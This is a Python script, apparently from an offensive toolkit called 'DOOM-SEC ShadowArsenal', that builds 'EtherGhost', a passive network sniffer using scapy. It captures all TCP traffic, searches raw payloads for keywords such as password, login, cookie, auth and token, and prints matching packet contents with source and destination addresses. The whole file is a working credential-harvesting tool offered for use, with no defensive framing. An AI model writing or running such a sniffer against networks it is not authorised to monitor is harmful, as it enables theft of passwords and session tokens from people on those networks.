
from scapy.all import *
import sys
import time

# EtherGhost - Passive Packet Sniffer
# Part of DOOM-SEC ShadowArsenal

def banner():
    print("""
    ███████╗████████╗██╗  ██╗███████╗██████╗  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
    ██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    █████╗     ██║   ███████║█████╗  ██████╔╝██║  ███╗███████║██║   ██║███████╗   ██║   
    ██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗██║   ██║██╔══██║██║   ██║╚════██║   ██║   
    ███████╗   ██║   ██║  ██║███████╗██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
    
    [ EtherGhost v1.0 | Passive Credential & Header Sniffer ]
    [ Part of DOOM-SEC | ShadowArsenal ]
    """)

keywords = ["pass", "user", "login", "cookie", "auth", "token", "key"]

def packet_callback(packet):
    try:
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Filter for interesting HTTP/FTP/Telnet data
            for k in keywords:
                if k in payload.lower():
                    print(f"\n[+] {k.upper()} FOUND in packet from {packet[IP].src} -> {packet[IP].dst}")
                    print("-" * 50)
                    print(payload[:300]) # First 300 bytes
                    print("-" * 50)
                    break
    except Exception:
        pass

def main():
    banner()
    print("[*] Starting EtherGhost Passive Sniffer...")
    print("[*] Filtering for keywords: " + ", ".join(keywords))
    print("[*] Press CTRL+C to stop.")
    
    try:
        # Sniff on all interfaces, no count limit
        sniff(filter="tcp", prn=packet_callback, store=0)
    except KeyboardInterrupt:
        print("\n[-] Stopping Sniffer.")
    except Exception as e:
        print(f"\n[-] Error: {e}")
        print("    Ensure you running as Administrator/Root.")

if __name__ == "__main__":
    main()
